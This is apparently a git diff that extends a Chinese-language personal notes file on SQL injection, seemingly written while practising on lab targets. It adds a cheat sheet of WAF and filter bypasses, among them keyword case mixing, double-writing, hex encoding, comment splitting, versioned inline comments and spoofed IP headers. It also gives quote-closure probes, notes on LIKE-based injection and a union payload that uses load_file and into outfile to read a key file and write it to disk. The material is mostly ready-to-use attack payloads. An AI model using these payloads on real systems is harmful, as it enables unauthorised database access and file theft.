@@ -297,3 +297,60 @@ mysql用gbk编码把两个字符当做一个汉字(编码方式改为unicode就�
 
 !!!!在post情况下的宽字节注入，得直接在burp的post数据包下进行修改，因为在前端不会将%df和\当做中文
 ```
+```
+奇淫巧技：
+1、大小写绕过：uNion SelEct
+2、双写绕过：ununionion seleselectct	(在union里面加上union，当数据库删除你的union时候，相当于显示了外围的union)
+3、编码绕过：'security' = 0x7365637572697479	(16进制，不需要单引号)
+4、注释符： un/**/ion sel/**/ect
+5、or and绕过：or = || and = &&
+6、%df会吃掉%5c(%bf   %aa    均可以吃掉)
+7、内联函数 : /*! select */ 1,2,3
+8、<>绕过：	un<>ion sel<>ect
+9、屏蔽逗号：
+select substr("security",1,3); ==>  select substr("security" from 1 for 3)
+union select 1,2,3 ==> union select * from (select 1)a join (select 2)b join (select 3)c;
+limit 0,1 ==> limit 0 offset 1
+10、sleep屏蔽
+and sleep(1) ==> and benchmark(100000000,1)
+11、group_concat屏蔽
+select group_concat("x", "y") ==> select group_concat_Ws("", "x", "y")
+12、=屏蔽
+使用like rlike regexp <>
+13、POST下屏蔽#
+--空格a，但大部分时间是用来当做空格的
+14、特殊符号过waf
+/*!50001 select * from users*/
+这里的50001=若果数据库的版本是5.00.01以上的版本，这个语句才会执行
+15、ip地址拦截
+放在burp的数据摆中
+x-forward-for
+x-remote-ip
+x-originating-ip
+x-remote-addr
+x-read-ip
+16、修改资源
+http://www.xx.com/sql.php?id=1	=> http://www.xx.com/sql.php/1.js?id=1
+```
+#### 注入部分心得
+```
+有的时候,你测试' and '1'='1 时候正确，其实是')
+?id=1';%00
+?id=1');%00
+上面两个哪个不报错就是哪种闭合方式
+
+`很重要
+以后写数据库语句的时候，最好用反引号
+select * from `table`	# 反引号用于修饰表名、列名
+
+name=-1' union select 1,load_file('../key.txt') into outfile 'C:/haha.txt' --+		// 直接读取并写入haha.txt文件中，但是into outfile不具备创建文件的能力
+```
+
+#### ！！！搜索形注入
+```
+原理：
+$sql="select * from user where password like '%$pwd%' order by password";
+```
+```
+其实相当于闭合方式是%'
+```
